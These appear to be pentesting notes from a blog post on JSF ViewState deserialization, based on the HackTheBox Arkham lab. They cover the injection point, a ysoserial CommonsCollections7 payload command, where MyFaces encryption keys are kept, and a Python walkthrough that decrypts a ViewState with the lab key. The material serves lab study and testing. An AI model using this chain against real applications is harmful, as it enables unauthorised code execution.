---
layout: post
title: Java JSF ViewState Deserialization
description: Java JSF ViewState Deserialization
summary: Java JSF ViewState Deserialization
tags: [java,deserialization,foothold]
minute: 1
---
## Viewstate
* Maintains states between postbacks
* Can be stored on client or server side. This is controlled by `javax.faces.STATE_SAVING_METHOD` settings.
* There are 2 major implementatons:
	* Oracle Mojarra (JSF reference implementation)
	* Apache MyFaces
* Can also be encrypted. base64-encoded keys are set by `org.apache.myfaces.SECRET`.
* If viewstate starts with `H4sIAAAA`, it is base64 gzip

## Viewstate Structure
It is a `java.util.HashMap`. Here is an example when generating a payload using ysoserial.

`

On a side note, java serialized objects starts with `AC ED`. Here is an example viewstate from HTB Arkham.

```
b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp\x02\x02'
```

## Example Errors
```bash
# error when providing invalid value to viewstate
javax.faces.application.ViewExpiredException: viewId:&#47;userSubscribe.faces - No saved view state could be found for the view identifier: &#47;userSubscribe.faces
org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:88)
org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
```

## Injection Points
```bash
# post data
j_id_jsp_1623871077_1%3Aemail=a&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState={PAYLOAD}
```

## Payload Gadgets and Affected Libraries
* commons-collections-3.2.1.jar
* commons-collections:3.1 - CommonsCollections7 in ysoserial

## Payloads
```bash
# ysoserial, CommonsCollections7
java -jar ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 "ping 10.10.14.31"
java -jar ~/data/tools/webapp/ysoserial-master.jar CommonsCollections7 "ping 10.10.14.31" > payload.dat
```

## Interesting Files and Directories
```bash
# config files
faces-config.xml
web.xml
```

## Interesting URL Paths
```bash
# JSF pages normally ends in .faces
/{ANYTHING}.faces
:8080/UserSubscribe.faces
```

## Encryption
* Default algorithm is `DES ECB mode`
* Viewstate can be encrypted. You can check for encyrption keys in this part of config files.

```xml
<param-name>org.apache.myfaces.SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
    <context-param>
        <param-name>org.apache.myfaces.MAC_ALGORITHM</param-name>
        <param-value>HmacSHA1</param-value>
     </context-param>
<context-param>
<param-name>org.apache.myfaces.MAC_SECRET</param-name>
<param-value>SnNGOTg3Ni0=</param-value>
</context-param>
<context-param>
```

* Here is an [example](https://0xdf.gitlab.io/2019/08/10/htb-arkham.html#decrypt-viewstate) encryption and decryption process using `HmacSHA1`

```bash
# encryption
payload -> des_ecb_encrypt -> hmac_sha1_sig -> b64_encode -> url_encode

# decryption
vs -> url_decode -> b64_decode -> hmac_sha1_unsig -> des_ecb_decrypt
```

* Python3 decryption

```python
# initialize
>>> vs = 'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D'

# url_decode
>>> import urllib
>>> url_decoded = urllib.parse.unquote_plus(vs)
>>> url_decoded
'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE='
>>> 

# b64_decode
>>> import base64
>>> b64_decoded = base64.b64decode(url_decoded)
>>> b64_decoded
b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe!\xd7e\x99\xf3\xde)\x03\xe6x8~\xdbr\x8d\xa3\\L\xb5E\x0cS\xa8\xb6.\xa2I\x8e\xefB\xad\x0e\xd9\xe0\x8c9\xb4\x98\xdc\xc0\xf6\xa1\xe3a\xea\xf1\xa3H\xd6\xef;\xb5\x99\xd2\x81^\xdcgOTf\x9de\x16L\x9c\x82\xb8\xd7\t\xbb\x11'
>>> 

# hmac_sha1_unsig - separate message and tag (mac)
#  tag     = last 20 bytes
#  message = whole signature - last 20 bytes
>>> t_bytes = b64_decoded[-20:]
>>> m_bytes = b64_decoded[:-20]
>>> t_bytes
b'\x99\xd2\x81^\xdcgOTf\x9de\x16L\x9c\x82\xb8\xd7\t\xbb\x11'
>>> m_bytes
b'\xc0z4\xc2b\xee\xe5\xc7\x88\xb4\x88\xbe#\xb5\xe4\x12-F\x01\xbe!\xd7e\x99\xf3\xde)\x03\xe6x8~\xdbr\x8d\xa3\\L\xb5E\x0cS\xa8\xb6.\xa2I\x8e\xefB\xad\x0e\xd9\xe0\x8c9\xb4\x98\xdc\xc0\xf6\xa1\xe3a\xea\xf1\xa3H\xd6\xef;\xb5'
>>> 

# des_ecb_decrypt - here you see the actual java serialized
# object which starts with "\xac\xed". It also includes the
# URL path associated with the object which is:
#   /userSubscribe.jsp
>>> from Crypto.Cipher import DES
>>> k = b'JsF9876-'
>>> crypter = DES.new(k, DES.MODE_ECB)
>>> crypter.decrypt(m_bytes)
b'\xac\xed\x00\x05ur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x03t\x00\x011pt\x00\x12/userSubscribe.jsp\x02\x02'
>>> 
```

## Tools
* [Online viewstate decoder](http://viewstatedecoder.azurewebsites.net/)

## References
* [Hacktricks - JSF Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization)
* [JSF ViewState upside-down](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
* [Demystifying Insecure Deserialisation on JSF Application](https://dhiyaneshgeek.github.io/web/security/2021/05/08/demystifying-insecure-deserialisation-on-JSF-application/)
* [Secure Your Application - MYFACES2 - Apache Software Foundation](https://cwiki.apache.org/confluence/display/MYFACES2/Secure+Your+Application)
* HTB Arkham